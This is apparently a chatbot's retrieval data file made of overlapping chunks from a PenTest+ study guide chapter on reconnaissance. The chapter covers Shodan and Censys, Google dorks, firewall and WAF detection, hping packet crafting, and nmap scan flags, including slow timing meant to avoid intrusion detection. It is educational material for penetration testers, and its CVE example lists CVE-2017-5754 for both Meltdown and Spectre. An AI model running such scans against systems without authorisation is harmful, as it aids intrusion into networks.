Key Infrastructure (PKI) that the certificates are a part of. This includes issuing parties, domain names, public keys, and quite possibly user identification information. You should check out tools that can help you with this function such as the one found at https://crt.sh. Information Disclosure Passive reconnaissance can lead to a high amount of information disclosure. Information disclosure is the release of information both intentionally and non‐intentionally. Obviously, when considering using information as a weapon, it's likely that it's passively obtained non‐intentionally. Another term for this is information release and it's also at times considered information leakage. No matter what you call it, it is a malicious actor's dream to gather information for an attack, and information disclosure can lead to high amounts of it.
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	should check out tools that can help you with this function such as the one found at https://crt.sh. Information Disclosure Passive reconnaissance can lead to a high amount of information disclosure. Information disclosure is the release of information both intentionally and non‐intentionally. Obviously, when considering using information as a weapon, it's likely that it's passively obtained non‐intentionally. Another term for this is information release and it's also at times considered information leakage. No matter what you call it, it is a malicious actor's dream to gather information for an attack, and information disclosure can lead to high amounts of it. Although it's been covered earlier and will continue to be covered throughout this chapter, many of the ways you can passively gather information is through sources such as open source intelligence (OSINT), social media scraping, DNS (and WHOIS) data, certificate transparency (CT) logs, and search engines. Search Engine Analysis and Enumeration When conducting reconnaissance operations, one of the targets vectors to look over is search engines. The amount of passive information that can be pulled, scraped, reviewed, collected, and assimilated from the web is quite extraordinary and honestly, very concerning. It is a blessing and a curse all in one. However, for the efforts around information gathering, it can provide a wealth of information in various ways. In this section, we'll review some of the methods and how to gather information for passive reconnaissance. The first and most obvious way is to do manual searching. The second way is to use specific tools. Let's review. Shodan Shodan, one of the most popular security search engines, provides prebuilt searches as well as categories of search for industrial control systems, databases, and other common search queries. Figure 3.4 shows results from a host identified with Shodan. Note that this result tells us that the target has a Cisco device with a default password enabled—a quick hit for a penetration tester! Censys Much like Shodan, Censys is a security‐oriented search engine. When you dig into a host in Censys, you will also discover GeoIP information if it is available, a comprehensive summary of the services the host exposes, and drill‐down links for highly detailed information. Figure 3.5 shows the same exposed Cisco IOS host, this time from a broader view. FIGURE 3.4 Shodan result from an exposed Cisco device Security search engines may not always have completely up‐to‐date information, so they're not the final answer for a pentester, but they are a very effective early step in passive information gathering and analysis. Prior to the creation of Shodan, Censys, and other search engines, gathering this type of data would have required active scanning by a pentester. Now, testers can gather useful information without interaction! But Wait, There's More! Although the PenTest+ exam outline only covers Shodan and Censys, you may also want to investigate ZoomEye.org, a search engine that provides somewhat similar capabilities to Shodan and Censys. Other commercial tools like the hunter.io search engine can be used to identify email address patterns
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	final answer for a pentester, but they are a very effective early step in passive information gathering and analysis. Prior to the creation of Shodan, Censys, and other search engines, gathering this type of data would have required active scanning by a pentester. Now, testers can gather useful information without interaction! But Wait, There's More! Although the PenTest+ exam outline only covers Shodan and Censys, you may also want to investigate ZoomEye.org, a search engine that provides somewhat similar capabilities to Shodan and Censys. Other commercial tools like the hunter.io search engine can be used to identify email address patterns as well as email addresses for organizations simply based on their domain. There are many other specialized search engines, so it can be worth your while to investigate what tools already exist before conducting manual searches or building your own tool. FIGURE 3.5 Censys IOS host view Google Dorks and Search Engine Techniques Although Censys and Shodan as well as other security‐oriented search engines are very useful for passive reconnaissance, you can also use traditional search engines like Google to perform information‐gathering activities. The Google Hacking Database (GHDB) can be incredibly useful if you need ideas that may be relevant to your intelligence gathering. You can find it at https://www.exploit-db.com/google-hacking-database. Search engines like Bing, Google, DuckDuckGo, and others can be used to find résumés, email addresses, phone numbers, files by type or date, and other useful information. Pentesters need to understand how to build queries using common search engines to obtain this type of information. Figure 3.6 shows a simple search via Google for the word password in Excel spreadsheets on websites with a .gov domain. Note that results show API information for an EPA site and a test sample from a Michigan government website with the password “passw0rd.” They aren't critical exposures, but they show the power of a simple search engine search for the right type of information. FIGURE 3.6 A Google search for passwords.xls Network Sniffing At the beginning of a black‐box penetration test, you will know very little about the networks, their layout and design, and what traffic they may carry. As you learn more about the target's network or networks, you can start to lay out a network topology or logical design. Knowing how a network is laid out and what subnets, network devices, and security zones exist on the network can be crucial to the success of a pentest. Network Topology Understanding the topology, or layout, of a network helps a pentester design their scanning and attack process. A topology map can provide information about what systems and devices are likely to be accessible, thus helping you make decisions about when to pivot to a different target to bypass security controls. Topology diagrams can be generated using tools like the Zenmap GUI for Nmap as well as purpose‐built network topology mapping programs. Although a Zenmap topology diagram, as shown in Figure 3.7, isn't always completely accurate, it can be helpful when you are trying
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	the success of a pentest. Network Topology Understanding the topology, or layout, of a network helps a pentester design their scanning and attack process. A topology map can provide information about what systems and devices are likely to be accessible, thus helping you make decisions about when to pivot to a different target to bypass security controls. Topology diagrams can be generated using tools like the Zenmap GUI for Nmap as well as purpose‐built network topology mapping programs. Although a Zenmap topology diagram, as shown in Figure 3.7, isn't always completely accurate, it can be helpful when you are trying to picture a network. Using scanning data to create a topological diagram has a number of limitations. Since you are using the time‐to‐live information and response to scans to determine what the network looks like, firewalls and other network devices can mean that your topology will not match reality. Always remember that an Nmap scan will only show you the hosts that respond and that other hosts and networks may exist. FIGURE 3.7 Zenmap topology view Detecting Network Defenses Pentesters often attempt to determine the infrastructure and technical defenses that an organization has in place. That means using detection techniques during scans and testing and combining that information with OSINT where possible. The PenTest+ exam outline focuses on four types of detection that you need to be aware of: Load balancer detection using tools like lbd (load balancing detector) to determine if there is a DNS‐ or an HTTP‐based load balancer in place. Tools like lbd will analyze differences in headers and responses from servers to determine if a load balancer is in place. You may also be able to simply perform a DNS query or even a ping to see if multiple IP addresses resolve for a website and if time to live (TTL) is different. Web application firewalls (WAFs) can be detected by reviewing cookies, headers, and HTTP responses, and by looking for specific behaviors like the use of FIN/RST packets to end unwanted connections. Unlike the other tools here, remotely detecting antivirus (AV) and antimalware tools is much harder since they don't provide a remotely visible signature or response. Antivirus can be problematic for a pentester since it may detect and remove useful tools. Fortunately, tools like BeEF (the Browser Exploitation Framework) provide antivirus detection modules that can be used to detect AV on a target system once access is gained. Firewalls have a number of common fingerprints that can be detected. Traceroutes can show where traffic no longer passes, but more detailed information takes more complex tools. Penetration tests often use Nmap scans to test for firewalls, although firewall devices may attempt to prevent scanners from detecting them. Much like load balancers, firewall detection capabilities pay attention to responses that may provide clues about what type of device is actually responding. Once a firewall is identified, the next step is often to map the devices behind the firewall with a tool like Firewalk, which scans to
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	once access is gained. Firewalls have a number of common fingerprints that can be detected. Traceroutes can show where traffic no longer passes, but more detailed information takes more complex tools. Penetration tests often use Nmap scans to test for firewalls, although firewall devices may attempt to prevent scanners from detecting them. Much like load balancers, firewall detection capabilities pay attention to responses that may provide clues about what type of device is actually responding. Once a firewall is identified, the next step is often to map the devices behind the firewall with a tool like Firewalk, which scans to determine what protocols a firewall device will pass through. Pentesters won't be surprised to learn that nmap has an NSE script that will attempt to determine if a target is protected by an IDS/IPS or WAF. Using the http‐waf‐detect NSE script is one possibility for testing at least some of the protective devices. Tools like wafw00f and WhatWaf can be used to try to detect web application firewalls, and the presence of antivirus tools may be able to be detected using techniques like dropping a copy of EICAR, the sample virus that is commonly used for AV validation. Eavesdropping and Packet Capture In addition to actively scanning for hosts and gathering topology information, pentesters will gather information using eavesdropping with packet capture or sniffer tools. Tools like Wireshark are often used to passively gather information about a network, including IP addresses, MAC addresses, time to live for packets, and even data about services and the content of traffic when it is unencrypted. Capturing network traffic from wireless networks can be done with Wireshark, but dedicated wireless capture tools like Kismet are also popular. Kismet provides additional features that can be useful when sniffing wireless networks, including the ability to find hidden SSIDs, passive association of wireless clients and access points, and a variety of tools that help to decrypt encrypted traffic. It is worth noting that some organizations use non‐Wi‐Fi wireless networks, including Bluetooth communications, proprietary protocols, and other communication methods based on RF (radio frequency). As you might imagine, Bluetooth is the most common non‐Wi‐Fi wireless implementation that most pentesters encounter, and its short range can make it challenging to intercept without getting close to your target. Fortunately, Bluetooth is often relatively insecure, making information gathering easier if you can get within range or gain access to a system that can provide that access. If your client or target uses a communication method outside of those typically in scope for a penetration test, like Ethernet and Wi‐Fi networks, you will need to make sure you have the right tools, software, and knowledge to capture and interpret that traffic, and that traffic is either in or out of scope as appropriate. SNMP Sweeps Another method for gathering information about network devices is to conduct an SNMP sweep. An SNMP sweep usually requires internal access to a network and thus may not be in the first round of your active reconnaissance
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	that can provide that access. If your client or target uses a communication method outside of those typically in scope for a penetration test, like Ethernet and Wi‐Fi networks, you will need to make sure you have the right tools, software, and knowledge to capture and interpret that traffic, and that traffic is either in or out of scope as appropriate. SNMP Sweeps Another method for gathering information about network devices is to conduct an SNMP sweep. An SNMP sweep usually requires internal access to a network and thus may not be in the first round of your active reconnaissance activities, but it can be very valuable once you have penetrated the exterior defenses of an organization. Conducting an SNMP sweep in most networks requires you to acquire the community string used by the network devices, and a lack of a response from a system does not mean there isn't a system at that IP address. In fact, there are four possible reasons a lack of response may occur: You may have the wrong community string, the system may be unreachable (firewalled or offline), the SNMP server service may not be running, or the fact that SNMP uses UDP is working against you and the response wasn't received yet—and may never be received at all! None of this means that you shouldn't attempt an SNMP scan of a network to gather information. It simply means that you may need more preparation before using a scanning tool. Once you have the information you need, SNMP scans can greatly help improve your network topology map and device discovery. The HighOn.Coffee Penetration Testing Tools Cheat Sheet is a great resource for specific commands, sorted by the penetration testing phase and type of enumeration or other effort. You can find it at https://highon.coffee/blog/penetration-testing-tools-cheat-sheet. Specific cheat sheets for other tools and techniques like nbtscan, reverse shells, and others are also available on the same site. If you'd like a book to work from, RTFM: Red Team Field Manual by Ben Clark (CreateSpace Independent Publishing Platform, 2014) is a wonderful resource. Packet Crafting and Inspection In addition to packet capture and network scanning, pentesters sometimes have to interact with packets and traffic directly to gather the information that they need. Manual or tool‐assisted packet creation can allow you to send packets that otherwise wouldn't exist or to modify legitimate packets with your own payloads. There are four typical tasks that packet crafting and inspection may involve: Performing packet review and decoding Assembling packets from scratch Editing existing packets to modify their content Replaying packets Wireshark is very useful for packet analysis, but pentesters often use other tools for packet crafting. Hping is popular because it allows you to create custom packets easily. For example, sending SYN packets to a remote system using hping can be done using the following command: hping -S -V targetsite.com -p 8080 In this example, the hping command would send SYN packets to targetsite.com on TCP port 8080 and provide verbose output.
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	four typical tasks that packet crafting and inspection may involve: Performing packet review and decoding Assembling packets from scratch Editing existing packets to modify their content Replaying packets Wireshark is very useful for packet analysis, but pentesters often use other tools for packet crafting. Hping is popular because it allows you to create custom packets easily. For example, sending SYN packets to a remote system using hping can be done using the following command: hping -S -V targetsite.com -p 8080 In this example, the hping command would send SYN packets to targetsite.com on TCP port 8080 and provide verbose output. While you may not always know the flags that a command uses, many flags can be guessed—a handy trick to remember for the exam! In addition to hping, other popular tools include Scapy, Yersinia, and even Netcat, but many pentesters are likely to start with hping for day‐to‐day use. Figure 3.8 shows the power of tools like Scapy. Building packets using a command‐line tool can allow you to perform simple actions—as shown earlier with a TCP ping to a web server port—but it can also allow you to perform complex actions like custom‐crafting TCP or other packets to test for vulnerabilities or to use as part of an exploit. FIGURE 3.8 Scapy packet crafting for a TCP ping Packet capture has another major use during penetration tests: documentation. Many pentesters capture most if not all of the traffic that they generate during their penetration testing efforts. If something goes wrong, the logged traffic can be used to document what occurred and when. Packet captures can also be useful if you think you missed something or cannot get a response to reoccur. The PenTest+ exam outline specifically asks you to understand what ARP traffic looks like and means. ARP (Address Resolution Protocol) is used to determine which host has what IP address. Thus, an ARP request and response that is captured via Wireshark might look like Figure 3.9. FIGURE 3.9 ARP query and response Analyzing traffic like this can provide useful information about other hosts on the network, and you'll want to make sure you are reasonably familiar with packet capture tools and common traffic captured by them. Internet of Things (IoT) and Operational Technology (OT) Protocols Conducting reconnaissance on Internet of Things (IoT) and operational technology (OT) can yield a large amount of useful information. With the expansion of wireless technology, industrial systems, and the use of technology in every solution worldwide, assessing information from these systems can prove to be fruitful. IoT and the protocols are used to cover a large attack surface and have exponentially increasing attack vectors. Consider what IoT is and what it does. IoT is used to allow devices and systems to communicate many types of solutions, including but not limited to wearables, smart home systems, sensors, and other wireless (or Bluetooth) devices. The IoT network therefore can be considered one of the largest in the world besides the public Internet with a vast number
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	technology, industrial systems, and the use of technology in every solution worldwide, assessing information from these systems can prove to be fruitful. IoT and the protocols are used to cover a large attack surface and have exponentially increasing attack vectors. Consider what IoT is and what it does. IoT is used to allow devices and systems to communicate many types of solutions, including but not limited to wearables, smart home systems, sensors, and other wireless (or Bluetooth) devices. The IoT network therefore can be considered one of the largest in the world besides the public Internet with a vast number of endpoints. The protocols used in IoT networks allow these devices to communicate between each other and with other systems. Information can be accessed from these systems and the protocols used to show what an organization is using, how they are using it, and where they are using it. It can also provide various entry points into the network or other types of intrusion. Operational technology (OT) is the name used to describe industrial equipment used to monitor and control machinery and other various industrial systems. The most commonly used among industrial type systems is SCADA (Supervisory Control and Data Acquisition) systems. These systems are often wired more than they are wireless and can provide an attacker with a map of building systems and controls. Banner Grabbing Passive reconnaissance of systems can also lead to banner grabbing as an option. When conducting protocol captures or using Shodan, you can collect banner‐related information without accessing the system directly tipping your hat to the attacker. As an example, Cisco Systems routers when you use SSH to reach them will provide a banner showing you whatever the administrator of the system wants to show you. It is often used to help identify the system itself to those using it on the network, or in many cases it offers a warning of what actions will be taken if the system is misused. These are some of the examples that may be seen. Others may be when you connect to any other system (Unix/Linux) that will provide a banner that may show system type, version, or distribution. Passively, when a banner is grabbed, it can provide a helpful guide to mapping an internal network and creating a map to what systems are found within. Again, since you are not directly connecting to the system itself, it would have never been possible to show you were there or that the attempt was made in the logs. Hypertext Markup Language (HTML) Scraping Hypertext Markup Language (HTML) scraping is commonly known as web scraping, which will also be covered in the active reconnaissance and enumeration discussion later in this chapter. It can be done both actively and passively. When done passively, you will want to do it in a way that cannot be tracked; therefore, doing so from a search engine and finding cached versions of the site (or pages) may help limit the footprint. HTML scraping allows
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	it would have never been possible to show you were there or that the attempt was made in the logs. Hypertext Markup Language (HTML) Scraping Hypertext Markup Language (HTML) scraping is commonly known as web scraping, which will also be covered in the active reconnaissance and enumeration discussion later in this chapter. It can be done both actively and passively. When done passively, you will want to do it in a way that cannot be tracked; therefore, doing so from a search engine and finding cached versions of the site (or pages) may help limit the footprint. HTML scraping allows you to collect data about a website or system using HTML, where the code itself is scraped and reviewed for any information that can be used to help launch an attack. Although most sites can be reviewed page by page to gather information, tools available such as Scrapy allow you to target the system and scrape its information quickly, and save you the time and energy spent on doing it manually. Again, for passive reconnaissance, it's important to remember that doing this process on a cached site may be required. Active Reconnaissance and Enumeration Building a list of all the resources or potential targets of a specific type is important in this stage of a penetration test. Once sufficient open source intelligence has been gathered via passive reconnaissance methods, testers typically move on to an active reconnaissance stage with the goal of first building, then narrowing down the list of hosts, networks, or other targets. Techniques for each of these vary, so you should be familiar with each of the following methods. Before we get into the specifics of how to address given scenarios and perform active reconnaissance, it's important to understand the basics of scoping the pentest. CVE and CWE The MITRE Corporation is a U.S. not‐for‐profit corporation that performs federally funded research and development. Among the tools it has developed or maintains are a number of classification schemes useful to pentesters: The Common Vulnerabilities and Exposures (CVE) list identifies vulnerabilities by name, number, and description. This makes the job of a pentester easier, because vendors, exploit developers, and others can use a common scheme to refer to vulnerabilities. A CVE listing will be in the format CVE‐[YEAR]‐[NUMBER]. For example, the 2017 Meltdown bug was assigned CVE‐2017‐5754, and Spectre is covered by CVE‐2017‐5754 and CVE‐2017‐5715. You can read more at https://cve.mitre.org. The Common Weakness Enumeration (CWE) is another community‐ developed list. CWE tackles a broad range of software weaknesses and breaks them down by research concepts, development concepts, and architectural concepts. You can read more about CWE at https://cwe.mitre.org. Real World Scenario Scenario, Part 2: Scoping the Penetration Test To scope the penetration test that you are performing for MCDS, you need to determine the following items: What domain names does MCDS own? What IP ranges does MCDS use for its public services? What email addresses can you gather? In addition, you should be able to answer the following
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	at https://cve.mitre.org. The Common Weakness Enumeration (CWE) is another community‐ developed list. CWE tackles a broad range of software weaknesses and breaks them down by research concepts, development concepts, and architectural concepts. You can read more about CWE at https://cwe.mitre.org. Real World Scenario Scenario, Part 2: Scoping the Penetration Test To scope the penetration test that you are performing for MCDS, you need to determine the following items: What domain names does MCDS own? What IP ranges does MCDS use for its public services? What email addresses can you gather? In addition, you should be able to answer the following questions: What does the physical location look like, and what is its address? What does the organization's staff list and org chart look like? What document metadata can you gather? What technologies and platforms does MCDS use? Does MCDS provide remote access for staff? What social media and employee information can you find? In this part of the chapter, you should consider how you would answer each of these questions. What Is Enumeration? Building the list of potential targets for a penetration test can be a massive task. If the scope and rules of engagement allow you to, you may enumerate network devices, systems, users, groups, shares, applications, and many other possible targets. Over the next few pages, we will look at some common methods of enumerating each of these targets. As you review each target type, bear in mind that there are both technical and social engineering methods to obtain this data and that the technical methods we discuss here are not the only possible methods you may encounter. Operating System (OS) Fingerprinting The ability to identify an operating system based on the network traffic that it sends is known as operating system fingerprinting, and it can provide useful information when performing reconnaissance. This is typically done using TCP/IP stack fingerprinting techniques that focus on comparing responses to TCP and UDP packets sent to remote hosts. Differences in how operating systems and even operating system versions respond, what TCP options they support, the order in which they send packets, and a host of other details can often provide a good guess at what OS the remote system is running. Figure 3.10 shows an OS identification test against the scanme.nmap.org sample host. Note that in this case, the operating system identification has struggled to identify the host, so our answer isn't as clear as you might expect. FIGURE 3.10 Nmap scan using OS identification The PenTest+ exam objectives cover and expect you to know the specific use of Nmap in information‐gathering scenarios. Nmap is the most commonly used command‐line vulnerability scanner and is a free, open source tool. It provides a broad range of capabilities, including multiple scan modes intended to bypass firewalls and other network protection devices. In addition, it provides support for operating system fingerprinting, service identification, and many other capabilities. Using Nmap's basic functionality is quite simple. Port scanning a system merely requires that Nmap be installed
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	isn't as clear as you might expect. FIGURE 3.10 Nmap scan using OS identification The PenTest+ exam objectives cover and expect you to know the specific use of Nmap in information‐gathering scenarios. Nmap is the most commonly used command‐line vulnerability scanner and is a free, open source tool. It provides a broad range of capabilities, including multiple scan modes intended to bypass firewalls and other network protection devices. In addition, it provides support for operating system fingerprinting, service identification, and many other capabilities. Using Nmap's basic functionality is quite simple. Port scanning a system merely requires that Nmap be installed and that you provide the target system's hostname or IP address. Figure 3.11 shows an Nmap of a Windows 10 system with its firewall turned off. A series of common Microsoft ports are shown, as Nmap scanned 1,000 of the most commonly used ports as part of its default scan. A more typical Nmap scan is likely to include a number of Nmap's command‐line flags: A scan technique, like TCP SYN, Connect, ACK, or other methods. By default, Nmap uses a TCP SYN scan (‐sS), allowing for fast scans that tend to work through most firewalls. In addition, sending only a SYN (and receiving a SYN/ACK) means that the TCP connection is not fully set up. TCP connect (sometimes called “full connect”) scans (‐ sT) complete the TCP three‐way handshake and are typically used when the user account using Nmap doesn't have the privileges needed to create raw packets—a common occurrence for pentesters who may not have gained a privileged account yet during a test. A final common scan technique flag is the ‐sU flag, used to conduct a UDP‐only scan. If you just need to scan for UDP ports, this flag allows you to do so. FIGURE 3.11 Nmap output of a Windows 10 system Nmap provides a multitude of features and many flags. You'll need to know quite a few of the common ones, as well as how a typical Nmap command line is constructed, for the exam. Make sure you practice multiple types of scans and understand what their results look like and how they differ. A port range, either specifying ports using the ‐p flag, including the full 1–65535 range, or specifying by port names like ‐p http. The ‐sA flag is used to conduct a TCP ACK scan and is most frequently used to test firewall rulesets. This can help determine whether a firewall is stateful, but it can't determine whether a port is open or closed. The ‐sT flag performs a TCP connect scan and uses a system call to do so, allowing you to use it on systems where you don't have the privileges to craft raw packets. It also supports IPv6 scans, which don't work with a SYN scan. The ‐sU flag performs a UDP scan, allowing you to identify UDP‐ based services, but it does not perform a TCP scan. The ‐sS flag will perform a TCP SYN (stealth) scan, which
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	firewall rulesets. This can help determine whether a firewall is stateful, but it can't determine whether a port is open or closed. The ‐sT flag performs a TCP connect scan and uses a system call to do so, allowing you to use it on systems where you don't have the privileges to craft raw packets. It also supports IPv6 scans, which don't work with a SYN scan. The ‐sU flag performs a UDP scan, allowing you to identify UDP‐ based services, but it does not perform a TCP scan. The ‐sS flag will perform a TCP SYN (stealth) scan, which is frequently used because it is very fast and is considered stealthier than a connect scan since it does not complete a TCP handshake, although this is increasingly more likely to be detected by modern firewalls and security systems. The ‐T0 to ‐T5 flags impact speed. T0 is very slow, whereas T5 is very aggressive. Service version detection using the –sV flag. OS detection using the –O flag. Disabling Ping using the ‐Pn flag. The aggressiveness of the scan via the ‐T timing flag. The timing flag can be set either using a numeric value from 0 to 5 or via the flag's text representation name. If you use a number, 0 will run an exceptionally slow scan, whereas 5 is a very fast scan. The text representation of these flags, in order, is paranoid|sneaky|polite|normal|aggressive|insane. Some testers will use a paranoid or a sneaky setting to attempt to avoid intrusion detection systems or to avoid using bandwidth. As you might suspect, ‐T3, or normal, is the default speed for Nmap scans. Input from a target file using ‐IL. Output to a variety of formats. You will want to be familiar with the ‐oX XML output flag, the ‐oN “normal” output mode, and even the outdated ‐oG greppable (searchable) format, which XML has almost entirely replaced. The ‐oA file, or “all” output mode, accepts a base filename and outputs normal, XML, and greppable formats all at the same time as basename.nmap, basename.xml, and basename.gmap. If you use multiple tools to interface with your Nmap results, this can be a very useful option! Figure 3.11 shows a sample default scan of a Windows system with its firewall turned off. There are a number of additional services running on the system beyond typical Windows services, but we can quickly identify ports 135, 139, and 445 as typical Windows services. Nmap also has an official graphical user interface, known as Zenmap, which provides additional visualization capabilities, including a topology view mode that provides information about how hosts fit into a network. Nmap usage is an important part of almost any penetration test. That means that you should be able to read an Nmap command line and identify what is occurring. For example, a typical command line might look like this: nmap -sT -sV -Pn -p 1-65435 -T2 -oA scanme scanme.nmap.org To understand what this command will do, you must understand each of the flags
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	and 445 as typical Windows services. Nmap also has an official graphical user interface, known as Zenmap, which provides additional visualization capabilities, including a topology view mode that provides information about how hosts fit into a network. Nmap usage is an important part of almost any penetration test. That means that you should be able to read an Nmap command line and identify what is occurring. For example, a typical command line might look like this: nmap -sT -sV -Pn -p 1-65435 -T2 -oA scanme scanme.nmap.org To understand what this command will do, you must understand each of the flags and how the command line is constructed. From left to right, we see that this is a TCP connect scan (‐sT), that we are attempting to identify the services (‐sV), that it will not send a ping (‐Pn), that it is scanning a port range from 1 to 65435 using the ‐p port selection flag, that the timing is slower than normal with the ‐T2 flag, and finally that this scan will send its output to files called scanme.nmap, scanme.xml, and scanme.gmap when it is done. The last part of the command is the target's hostname: scanme.nmap.org. If you read that command line carefully, you may have noted that the port specification doesn't actually cover all 65,535 ports—in fact, we specified 65,435! Typos and mistakes happen, and you should be prepared to identify this type of issue in questions about port and vulnerability scans. If you want to practice your Nmap techniques, you can use scanme.nmap.org as a scan target. The people who provide the service ask that you use it for test scans and that you don't hit them with abusive or heavy usage. You may also want to set up other scan targets using tools like Rapid 7's Metasploitable virtual machine (https://information.rapid7.com/metasploitable-download.html), which provides many interesting services to scan and exploit. In addition to its traditional port scanning capabilities, Nmap includes NSE, the Nmap scripting engine. Prebuilt scripts allow additional capabilities, including vulnerability scanning from the command line. You can find a list of the scripts and what they do at https://nmap.org/nsedoc/index.html. To use the vulnerability scanning scripts, you can use the ‐script=vuln flag. Real World Scenario Scenario, Part 3: Scanning for Targets Now that you have identified the organization's external IP addresses, you are ready to conduct a scan of its systems. A member of your team suggests running the following nmap scan against your client's network range from your testing workstations: nmap -sT -T0 10.11.42.0/23 Make sure you can answer the following questions: If the client organization's IP range is 10.11.42.0/24, what would this command do? What flags would you recommend that you use to identify the services and operating systems found in that scan? Is the TCP connect scan the correct choice, and why? What ports would the command your team member suggested scan, and what might this mean for your penetration test? What other improvements might you make to this scan? Service Discovery Service
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	suggests running the following nmap scan against your client's network range from your testing workstations: nmap -sT -T0 10.11.42.0/23 Make sure you can answer the following questions: If the client organization's IP range is 10.11.42.0/24, what would this command do? What flags would you recommend that you use to identify the services and operating systems found in that scan? Is the TCP connect scan the correct choice, and why? What ports would the command your team member suggested scan, and what might this mean for your penetration test? What other improvements might you make to this scan? Service Discovery Service discovery is one of the most common tasks that a pentester will perform while conducting active reconnaissance. Identifying services provides a list of potential targets, including vulnerable services and those you can test using credentials you have available, or even just to gather further information from. Service identification is often done using a port scanner. Port scanning tools are designed to send traffic to remote systems and then gather responses that provide information about the systems and the services they include. That makes them one of the most frequently used tools in a pentester's toolkit, and thus something you'll see featured throughout the exam. Although there are many port scanners, they almost all have a number of common features, including these: Host discovery Port scanning and service identification Service version identification Operating system identification An important part of port scanning is an understanding of common ports and services. Ports 0–1023 are known as well‐known ports or system ports, but there are quite a few higher ports that are commonly of interest when conducting port scanning. Ports ranging from 1024 to 49151 are registered ports and are assigned by IANA when requested. Many are also used arbitrarily for services. Because ports can be manually assigned, simply assuming that a service running on a given port matches the common usage isn't always a good idea. In particular, many SSH and HTTP/HTTPS servers are run on alternate ports, either to allow multiple web services to have unique ports or to avoid port scanning that only targets their normal port. Table 3.1 lists some of the most commonly found interesting ports. TABLE 3.1 Common ports and services Port 20 21 TCP/UDP Service TCP, UDP FTP data TCP, UDP FTP control 22 23 25 53 67 68 69 80 TCP, UDP SSH TCP, UDP Telnet TCP, UDP SMTP (email) UDP DNS TCP, UDP DHCP server TCP, UDP DHCP client TCP, UDP TFTP TCP, UDP HTTP 88 110 123 135 136–139 143 161 TCP, UDP Kerberos TCP, UDP POP3 TCP, UDP NTP TCP, UDP Microsoft EPMAP TCP, UDP NetBIOS TCP IMAP UDP SNMP 162 389 443 445 500 515 1433 1434 TCP, UDP SNMP traps TCP, UDP LDAP TCP, UDP HTTPS TCP Microsoft AD and SMB TCP, UDP ISAKMP, IKE TCP LPD print services TCP Microsoft SQL Server TCP, UDP Microsoft SQL Monitor 1521 TCP Oracle database listener Port TCP/UDP Service 1812, 1813 TCP, UDP RADIUS
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	TCP, UDP SMTP (email) UDP DNS TCP, UDP DHCP server TCP, UDP DHCP client TCP, UDP TFTP TCP, UDP HTTP 88 110 123 135 136–139 143 161 TCP, UDP Kerberos TCP, UDP POP3 TCP, UDP NTP TCP, UDP Microsoft EPMAP TCP, UDP NetBIOS TCP IMAP UDP SNMP 162 389 443 445 500 515 1433 1434 TCP, UDP SNMP traps TCP, UDP LDAP TCP, UDP HTTPS TCP Microsoft AD and SMB TCP, UDP ISAKMP, IKE TCP LPD print services TCP Microsoft SQL Server TCP, UDP Microsoft SQL Monitor 1521 TCP Oracle database listener Port TCP/UDP Service 1812, 1813 TCP, UDP RADIUS As a pentester, you will want to have a good command of the information in Table 3.1 as well as the common operating system– specific ports. For example, you should be able to identify a system with TCP ports 139, 445, and 3389 all open as being likely indicators of a Windows system. Don't worry; we have included review questions like this at the end of this chapter and in the practice tests to help you learn! Service and Version Identification The ability to identify a service can provide useful information about potential vulnerabilities as well as verifying that the service that is responding on a given port matches the service that typically uses that port. Service identification is usually done in one of two ways: either by connecting and grabbing the banner (as covered earlier) or connection information provided by the service or by comparing its responses to the signatures of known services. Protocol Enumeration As was just covered in service discovery, protocol enumeration is similar in that as you learned about services offered through ports, many of those ports are connected to various protocols. For example, when conducting a penetration test or an assessment via a vulnerability scan, you will likely find associated services, ports, and protocols. Using Nmap, you will find targets based on these criteria. Nmap can be used to find open ports via the scanner on the target machine. Once you have a list of open ports, they can be cross‐checked to the protocols that are running. Note that protocols' ports can be changed from their default, but the default ports for certain services are often not changed. An example of this would be port 80 used for HTTP changed to port 8080. When conducting the scan to identify open ports and possible attack vectors, some of the most common ones you will find will be FTP running on port 21, HTTP running on port 80, SMTP running on port 25, and SNMP running on port 161. The next step in enumerating the target machine would be to select a port that is open such as SNMP on port 161 and begin to target devices running SNMP. This is the most basic form of protocol enumeration. When conducting enumeration of the Simple Network Management Protocol (SNMP), you will find a plethora of data related to network mapping. SNMP is a protocol that allows you to
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	some of the most common ones you will find will be FTP running on port 21, HTTP running on port 80, SMTP running on port 25, and SNMP running on port 161. The next step in enumerating the target machine would be to select a port that is open such as SNMP on port 161 and begin to target devices running SNMP. This is the most basic form of protocol enumeration. When conducting enumeration of the Simple Network Management Protocol (SNMP), you will find a plethora of data related to network mapping. SNMP is a protocol that allows you to manage and monitor network devices in a TCP/IP network. A tool like SNMPwalk allows you to collect SNMP data from network devices and specially find which object identifiers (OIDs) are responding to queries. By doing this, you can actively scan a network and find data that can help you conduct an attack. DNS Enumeration As you have learned earlier in the chapter, the Domain Name System (DNS) is often one of the first stops when gathering information about an organization. Not only is DNS information publicly available, but it is also often easily connected to the organization by simply checking for WHOIS information about its website. With that information available, you can find other websites and hosts to add to your organizational footprint. This footprint can also be identified from a process called DNS footprinting, which is when you actively look to create a map of what an organization looks like from a host view. There is so much information that can be taken and used from DNS enumeration, including but not limited to, DNS records and how those records map to hostnames and IP addresses across the enterprise. By gathering this info, other attacks can be made, or more active reconnaissance can be conducted. For example, you may have an email server record and be able to find the IP address, then scan for SMTP vulnerabilities. Various other tools can be used to include nslookup commonly found on all Microsoft Windows systems, dig found on most Linux distros, and Maltego. Directory Enumeration When conducting enumeration, one of the best sources of organizational information will come from its directory services. A directory is generally an 